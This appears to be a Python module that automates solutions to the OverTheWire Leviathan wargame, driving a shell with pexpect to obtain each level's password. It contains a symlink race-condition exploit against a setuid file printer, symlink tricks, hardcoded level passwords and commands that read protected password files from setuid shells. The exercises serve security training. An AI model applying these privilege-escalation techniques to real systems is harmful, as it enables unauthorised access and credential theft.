"""Implementations of solutions for Leviathan OTW levels.

Each level function accepts a pexpect spawn instance argument and returns the
password string for the next level.
"""
import textwrap


def _get_password_from_shell(func):
    """Decorator to extract the password from a set uid shell.

    Many of the level solutions start an interactive set uid shell. The process
    of extracting the newly-readable password file (that of the next level) is
    identical once the shell is reached.
    """
    def wrapped(proc):
        # Hack to get the level number without it being explicitly provided
        current_level = int(func.__name__.lstrip('leviathan'))

        # Run the function to start the shell
        func(proc)

        # Use the shell prompt to get the next password
        proc.expect(r'\$ ')
        proc.sendline('cat /etc/leviathan_pass/leviathan%d' % (current_level + 1))
        proc.expect(r'\$ ')
        password = proc.before.splitlines()[1]

        # Exit the shell
        proc.sendeof()

        return password

    return wrapped


def leviathan_minus_1(unused_proc):
    return 'leviathan0'


def leviathan0(proc):
    # Single line is wrapped in the output (likely terminal width limitation)
    proc.sendline('grep -o "the password for leviathan1 is [^\\"]*" \\\n'
                  '~/.backup/bookmarks.html | cut -d" " -f6')
    proc.expect(r'\$ ')
    return proc.before.splitlines()[2]


@_get_password_from_shell
def leviathan1(proc):
    proc.sendline('~/check')
    proc.expect('password: ')
    proc.sendline('sex')


def leviathan2(proc):
    proc.sendline(textwrap.dedent("""
        exploit() {
            TEMP=`mktemp -d`
            chmod +rx "$TEMP"

            SYM="$TEMP/foo"
            DUMMY="$TEMP/bar"
            PWORD=/etc/leviathan_pass/leviathan3

            flip_symlink() {
                touch "$DUMMY"
                while true; do
                    ln -sf "$PWORD" "$SYM";
                    ln -sf "$DUMMY" "$SYM";
                done;
            }

            retry_printfile() {
                RESULT=
                while [[ ! "$RESULT" ]]; do
                    RESULT=`~/printfile "$SYM" | grep -v "You cant"`
                done
                echo $RESULT
            }

            # Run in subshell to suppress PID output
            { flip_symlink & } 2> /dev/null
            PID=$!
            retry_printfile
            kill "$PID"
        }
    """).strip())
    proc.expect(r'\$ ')
    proc.sendline('exploit')
    proc.expect(r'\$ ')
    return proc.before.splitlines()[1]


@_get_password_from_shell
def leviathan3(proc):
    proc.sendline('~/level3')
    proc.expect('Enter the password> ')
    proc.sendline('snlprintf')


def leviathan4(proc):
    proc.sendline('.trash/bin | rax2 -b')
    proc.expect(r'\$ ')
    return proc.before.splitlines()[1]


def leviathan5(proc):
    proc.sendline('ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log')
    proc.expect(r'\$ ')
    proc.sendline('./leviathan5')
    proc.expect(r'\$ ')
    return proc.before.splitlines()[1]


@_get_password_from_shell
def leviathan6(proc):
    proc.sendline('./leviathan6 7123')
